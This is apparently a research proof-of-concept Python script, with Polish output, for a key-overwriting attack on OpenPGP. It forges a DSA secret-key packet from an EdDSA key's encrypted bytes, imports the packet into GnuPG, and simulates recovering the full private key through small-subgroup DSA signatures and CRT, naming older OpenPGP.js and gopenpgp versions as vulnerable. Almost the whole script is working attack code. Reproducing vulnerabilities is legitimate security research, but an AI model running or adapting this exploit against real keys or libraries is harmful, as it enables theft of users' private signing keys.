import argparse
import hashlib
import os
import random
import struct
import subprocess
import sys
import time
from pathlib import Path

import pgpy
from sympy import factorint, isprime
from sympy.ntheory.modular import crt

from pgp_packets import (mpi, packet, userid_body, sig_hashed_subpackets, sig_hashed_subpackets_doc, build_cert_signature_hash_input,
                          build_doc_signature_hash_input, build_signature_packet, dsa_truncate_hash)
from dsa_math import (find_small_subgroup_params, dsa_sign, dsa_verify)

def ok(m):   print(f"  [OK] {m}")
def fail(m): print(f"  [!!] {m}")
def warn(m): print(f"  [!]  {m}")

def structural_proof_part(victim_key_path: str, passphrase: str):
    print("Brak wiazania kryptograficznego\n")

    key, _ = pgpy.PGPKey.from_file(victim_key_path)
    with key.unlock(passphrase):
        km = key._key.keymaterial
        x_real = int(km.s)
        s2k_bytes = bytes(km.s2k)
        enc_blob = bytes(km.encbytes)

    print(f"Klucz ofiary: {victim_key_path} (EdDSA/Ed25519, algo={key.key_algorithm.value})")
    print(f"Fingerprint: {key.fingerprint}")
    print()
    print(f"  Struktura Secret Key Packet")
    print(f"     pola publiczne (cleartext):")
    print(f"        version, created, algo, curve OID, public point Q")
    print(f"     pola prywatne (szyfrowane CFB, S2K usage=254):")
    print(f"        S2K block:      {len(s2k_bytes)} B  (sym algo, salt, count, IV)")
    print(f"        encrypted blob: {len(enc_blob)} B  (MPI(sekret) + SHA-1 checksum)")
    print()
    print(f"x_real, sekret, 256 bit, do weryfikacji PoC:")
    print(f"     {x_real}")
    return x_real, s2k_bytes, enc_blob, key.fingerprint

def build_forged_dsa_key(s2k_bytes, enc_blob, x_for_self_sig, p, q, g, y, uid_text, hashalgo=10, sigtype=0x13):
    created = int(time.time())
    pubkey_body = bytes([0x04]) + struct.pack(">I", created) + bytes([17]) + mpi(p) + mpi(q) + mpi(g) + mpi(y)
    fpr = hashlib.sha1(b"\x99" + struct.pack(">H", len(pubkey_body)) + pubkey_body).digest()
    keyid = fpr[-8:]

    hashed_sp = sig_hashed_subpackets(created, fpr, key_flags=0x03)
    hash_input = build_cert_signature_hash_input(pubkey_body, uid_text, 4, sigtype, 17, hashalgo, hashed_sp)
    hashfn = hashlib.sha512 if hashalgo == 10 else hashlib.sha256
    digest = hashfn(hash_input).digest()
    h_val = dsa_truncate_hash(digest, q.bit_length())

    rng = random.Random(int.from_bytes(os.urandom(8), "big"))
    r, s, _k = dsa_sign(h_val, x_for_self_sig, p, q, g, rng)
    sig_body = build_signature_packet(sigtype, 17, hashalgo, hashed_sp, keyid, r, s, digest[:2])

    seckey_body = pubkey_body + s2k_bytes + enc_blob
    forged = packet(5, seckey_body) + packet(13, userid_body(uid_text)) + packet(2, sig_body)
    
    return forged, fpr


def real_gnupg_test_part(x_real, s2k_bytes, enc_blob):
    print("\nTest wobec GnuPG: import cross-algorithm\n")

    print("Budujemy sfalszowany Secret Key Packet: algo=DSA (17), reuzywajac te same bajty S2K + zaszyfrowanego sekretu z klucza EdDSA")
    print()

    p, q, g = find_small_subgroup_params(256, p_bits=1024, seed=42)
    y = pow(g, x_real, p) 
    uid_text = "Victim Protected <victim2@atak05.com>"

    forged, fpr = build_forged_dsa_key(s2k_bytes, enc_blob, x_real, p, q, g, y, uid_text)
    forged_path = Path("forged_crossalgo.gpg")
    forged_path.write_bytes(forged)
    print(f"Sfalszowany klucz: {len(forged)} B, nowy fingerprint {fpr.hex().upper()}")
    print()

    gnupghome = Path("victim_gnupg_test")
    subprocess.run(["rm", "-rf", str(gnupghome)])
    gnupghome.mkdir(mode=0o700)
    env = dict(os.environ, GNUPGHOME=str(gnupghome))

    res = subprocess.run(["gpg", "--batch", "--import", str(forged_path)], capture_output=True, env=env)
    stderr = res.stderr.decode("utf-8", "replace")
    success = "secret key imported" in stderr or "secret keys imported" in stderr

    if success:
        ok("gpg --import: klucz zaakcpetowany jako poprawny DSA Secret Key.")
        ok("Sekret EdDSA zostal pomyslnie 'przekonwertowany' na DSA bez modyfikacji jednego bajtu zaszyfrowanego sekretu")
        ok("brak wiazania kryptografcznego publicznych/prywatnych pol")
    else:
        fail("Import nieoczekiwanie nieudany:")
        print("    " + stderr.replace("\n", "\n    "))

    print()

    return success, (p, q, g)


class VulnerableLibrarySimulator:
    def __init__(self, x_real: int, s2k_bytes: bytes, enc_blob: bytes):
        self._x_real = x_real
        self.s2k_bytes = s2k_bytes
        self.enc_blob = enc_blob

    def attacker_corrupt_key(self, p, q, g):
        created = int(time.time())
        pubkey_body = (bytes([0x04]) + struct.pack(">I", created) + bytes([17]) + mpi(p) + mpi(q) + mpi(g) + mpi(1))
        
        return packet(5, pubkey_body + self.s2k_bytes + self.enc_blob), created

    def victim_sign(self, p, q, g, message: bytes):
        sig_created = int(time.time())
        hashed_sp = sig_hashed_subpackets_doc(sig_created)
        hash_input = build_doc_signature_hash_input(message, 4, 0x00, 17, 8, hashed_sp)
        digest = hashlib.sha256(hash_input).digest()
        h_val = dsa_truncate_hash(digest, q.bit_length())
        rng = random.Random(int.from_bytes(os.urandom(8), "big"))
        r, s, _k = dsa_sign(h_val, self._x_real, p, q, g, rng)
        
        return r, s, h_val

    @property
    def ground_truth_x(self):
        return self._x_real


def attacker_recover_residue(lib: VulnerableLibrarySimulator, p, q, g, n_msgs=2):
    candidate_sets = []
    for i in range(n_msgs):
        msg = f"wiadomosc-testowa-{i}-{random.random()}".encode()
        r, s, h_val = lib.victim_sign(p, q, g, msg)
        w = pow(s, -1, q)
        u1 = (h_val * w) % q
        u2 = (r * w) % q
        g_u1 = pow(g, u1, p)
        cands = set()
        y_pow = 1
        
        for x in range(q):
            if (g_u1 * pow(y_pow, u2, p)) % p % q == r:
                cands.add(x)
            y_pow = (y_pow * g) % p
        
        candidate_sets.append(cands)
    inter = candidate_sets[0]
    
    for c in candidate_sets[1:]:
        inter &= c
    
    return inter


def full_extraction_part(x_real, s2k_bytes, enc_blob, n_rounds=18, q_bits=16):
    print(f"\nPelna ekstrakcja sekretu (symulacja biblioteka bez walidacji DSA)\n")
    warn("Symulacja modeluje Sequoia / stary OpenPGP.js<4.10.5 / stary gopenpgp<2.1")
    print(f"Parametry: {n_rounds} rund (jak Tabela 1 pracy: '256-bit x: 18'),")
    print(f"q_bits={q_bits} per runda, 2 sygnatury/runda")
    print()

    lib = VulnerableLibrarySimulator(x_real, s2k_bytes, enc_blob)
    residues, moduli = [], []
    t0 = time.time()
    ambiguous = 0

    for i in range(n_rounds):
        p, q, g = find_small_subgroup_params(q_bits, p_bits=1024, seed=2000 + i)
        lib.attacker_corrupt_key(p, q, g) 
        cands = attacker_recover_residue(lib, p, q, g, n_msgs=2)
        if len(cands) == 1:
            x_mod_q = next(iter(cands))
            residues.append(x_mod_q)
            moduli.append(q)
            match = (x_mod_q == x_real % q)
            print(f"  runda {i+1:2}/{n_rounds}: q={q:6} (16b)  kandydatow={len(cands)}  zgodnosc_czesciowa={match}")
        else:
            ambiguous += 1
            print(f"  runda {i+1:2}/{n_rounds}: q={q:6}  "
                  f"niejednoznacznie ({len(cands)} kandydatow) — pomijane")

    elapsed = time.time() - t0
    
    print()
    result, mod = crt(moduli, residues)
    x_recovered = int(result) % int(mod)

    print(f"Rund uzytych: {len(residues)}/{n_rounds} (niejednoznacznych: {ambiguous})")
    print(f"Czas calkowity: {elapsed:.1f}s ({elapsed/n_rounds:.2f}s/runda)")
    print(f"CRT-modulus (iloczyn q_i): {mod.bit_length()} bit (sekret: {x_real.bit_length()} bit)")
    print()
    
    full_match = (x_recovered == x_real)
    
    if full_match:
        fail(f"Pelne odzyskanie sekretu: x_recovered == x_real (256/256 bit)")
        fail(f"x_recovered = {x_recovered}")
    else:
        warn(f"Brak pelnej zgodnosci (mod-product < bit-length sekretu?) — sprawdz parametry")
    
    return x_recovered, full_match, elapsed

def main():
    ap = argparse.ArgumentParser(description="Atak 5 — KO Attack (Key Overwriting)")
    ap.add_argument("--victim-key", required=True, help="Plik .gpg ofiary (EdDSA, chroniony haslem)")
    ap.add_argument("--passphrase", required=True, help="Haslo klucza ofiary")
    ap.add_argument("--rounds", type=int, default=18, help="Liczba rund w Czesci C (domyslnie 18, jak Tabela 1)")
    ap.add_argument("--q-bits", type=int, default=16, help="Rozmiar q dla small-subgroup w Czesci C")
    ap.add_argument("--skip-gnupg-test", action="store_true", help="Pomin Czesc B (wymaga gpg)")
    args = ap.parse_args()

    if not Path(args.victim_key).exists():
        print(f"Blad: plik {args.victim_key} nie istnieje.", file=sys.stderr)
        sys.exit(1)

    x_real, s2k_bytes, enc_blob, fpr = structural_proof_part(args.victim_key, args.passphrase)

    gnupg_ok = False
    if not args.skip_gnupg_test:
        gnupg_ok, _ = real_gnupg_test_part(x_real, s2k_bytes, enc_blob)
    else:
        warn("Czesc B pominieta na zadanie (--skip-gnupg-test)")

    x_rec, full_match, elapsed_c = full_extraction_part( x_real, s2k_bytes, enc_blob, n_rounds=args.rounds, q_bits=args.q_bits)


if __name__ == "__main__":
    main()